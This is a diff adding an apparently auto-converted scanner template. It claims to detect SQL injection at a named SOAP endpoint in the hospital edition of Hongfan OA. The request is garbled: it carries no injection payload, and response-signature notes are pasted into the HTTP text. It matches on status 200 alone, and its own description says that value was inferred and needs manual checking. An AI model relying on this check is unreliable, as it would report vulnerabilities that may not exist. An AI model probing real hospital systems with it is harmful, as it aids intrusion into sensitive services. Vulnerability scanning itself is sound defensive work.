@@ -1,0 +1,36 @@
+id: poc-tgle8srkl5uyxt6f
+info:
+  name: 红帆 OA 医院版 sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgle8srkl5uyxt6f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tgle8srkl5uyxt6f
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /iOffice/prg/set/wss/wssRtSyn.asmx?op=SubmitShowMsg HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    ^(?=.*?SubmitShowMsg)(?=.*?ServerHost)(?=.*?SubmitShowMsgResponse).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
